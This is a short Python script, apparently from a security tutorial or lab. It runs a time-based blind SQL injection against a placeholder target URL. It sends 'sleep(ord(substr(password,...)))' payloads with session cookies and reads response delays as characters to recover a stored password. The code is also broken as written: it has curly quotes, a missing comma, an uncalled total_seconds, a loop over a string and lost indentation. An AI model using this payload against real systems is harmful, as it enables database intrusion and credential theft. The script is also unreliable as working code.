import requests

times = []
print “Kicking off the attempt”
cookies = {'cookie name': 'Cookie value'}

payload = {'injection': '\'or sleep char_length(password);#',
'Submit': 'submit'}
req = requests.post('<target url>' data=payload, cookies=cookies)
firstresponsetime = str(req.elapsed.total_seconds)
for x in range(1, firstresponsetime):
payload = {'injection': '\'or sleep(ord(substr(password,
'+str(x)+', 1)));#', 'Submit': 'submit'}
req = requests.post('<target url>', data=payload,
cookies=cookies)
responsetime = req.elapsed.total_seconds
a = chr(responsetime)
times.append(a)
answer = ''.join(times)
print “Recovered String: “+ answer

